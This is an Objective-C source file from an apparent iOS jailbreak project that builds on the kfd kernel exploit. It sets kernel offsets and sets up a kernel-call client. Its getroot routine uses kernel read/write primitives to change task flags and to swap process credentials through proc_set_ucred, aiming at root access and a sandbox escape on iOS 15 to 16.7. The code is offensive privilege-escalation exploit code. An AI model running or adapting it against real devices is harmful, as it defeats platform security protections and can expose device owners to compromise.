//
//  meow.m
//  kfd-meow
//
//  Created by mizole on 2024/02/04.
//

#import <Foundation/Foundation.h>
#include "meow.h"

/*
 #========= PROGRESS =========
 # kcall:    arm64  15.0 - 16.7
 #           arm64e
 # unsandbx: arm64
 #           arm64e
 #============================
 */

void getroot(void) {
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    
    //TODO: get root with physrw
    
    uint32_t t_flags_bak = kread32_kfd(our_task + off_task_t_flags);
    uint32_t t_flags = t_flags_bak | 0x00000400;
    kwrite32_kfd(our_task + off_task_t_flags, t_flags);
    
    printf("getuid() : %d\n", getuid());
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    
    kwrite32_kfd(our_task + off_task_t_flags, t_flags_bak);
    if(isAvailable() >= 6 && !isarm64e()) {
        eary_kcall(proc_set_ucred, our_proc, our_ucred, 0, 0, 0, 0, 0);
        setuid(501);
    }
    
}

/*---- meow ----*/
int meow(void) {
    
    set_offsets();
    usleep(5000);
    setup_client();
    //getroot();
    //Fugu15KPF();
    
    return 0;
}
